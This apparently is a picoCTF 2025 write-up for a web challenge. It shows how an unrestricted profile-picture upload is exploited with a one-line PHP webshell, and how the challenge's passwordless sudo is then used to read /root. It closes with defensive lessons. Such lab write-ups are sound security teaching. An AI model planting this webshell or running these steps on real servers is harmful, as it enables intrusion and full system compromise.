# 🌀 n0s4n1ty 1 — Writeup

![Challenge Banner](https://github.com/user-attachments/assets/5321772c-d41a-4f64-af76-b55f93a70650)

---

## 📌 Challenge Info
- **Category:** Web Exploitation
- **Difficulty:** Easy
- **Event:** picoCTF 2025

**Description:**  
A developer added profile picture upload functionality, but with flawed implementation. Our mission is to exploit the upload form and grab the hidden flag from `/root`.

---

## 🛠️ Steps to Solve

### 1️⃣ Inspect the Upload Page
We were given a profile upload site. By inspecting the source code (`CTRL + U`), we found that the upload form directly sends files to `upload.php` without any restrictions.

📸 Screenshot:

![Upload Page](https://github.com/user-attachments/assets/d9f2afe6-e980-4164-b960-15af9b73f6a7)

---

### 2️⃣ Confirm No File Restrictions
The code shows **no validation checks** on file type or extension. This means we can upload any file, including `.php` webshells.

```html
<form action="upload.php" method="post" enctype="multipart/form-data">
    <input type="file" name="fileToUpload" id="fileToUpload" />
    <button type="submit">Upload Profile</button>
</form>
```

---

### 3️⃣ Upload a PHP Webshell
We created a simple PHP shell:
```php
<?php system($_REQUEST['cmd']); ?>
```
Saved it as `upload.php` and uploaded it successfully.

📸 Screenshot:

![Upload Success](https://github.com/user-attachments/assets/91f3dfee-cbfe-4280-a45c-d8bdcc6d2542)

The site responded with a file path:
```
uploads/upload.php
```

---

### 4️⃣ Execute Commands via Webshell
By visiting:
```
uploads/upload.php?cmd=ls -lah
```
We could run arbitrary commands on the server 🎉

📸 Screenshot:

![Uploaded Path](https://github.com/user-attachments/assets/4ed2888c-4cce-4e84-a893-bf2f8e1534f4)

We tried listing `/root`, but nothing appeared. Then we checked the hint, which suggested running `sudo -l`.

---

### 5️⃣ Privilege Escalation
Running `sudo -l` showed this output:

![Sudo Privileges](https://github.com/user-attachments/assets/45d1db88-ea7b-4bf1-a16a-a3523cb8ba40)

This means the user `www-data` has **full root privileges without a password** (`NOPASSWD: ALL`).

So we can run:
```
uploads/upload.php?cmd=sudo ls -lah /root
```
and gain access to the protected flag!

---

## 🔎 Explanation of the Vulnerability
- The server did not restrict file uploads, allowing arbitrary code execution.
- With a PHP shell, we gained **remote code execution**.
- Due to `sudo` misconfiguration, `www-data` had **full root access** with no password required.

---

## 📝 Lesson Learned
- Always **validate and restrict file uploads** (e.g., only images, MIME checks, rename files).
- Never grant `www-data` or web users unrestricted `sudo` privileges.
- This challenge shows how a simple file upload bug can escalate to **full system compromise**.

---

## 🎯 Flag
```
picoCTF{<redacted_flag_here_for_example>}
```

🌀 Game over — full pwn achieved!
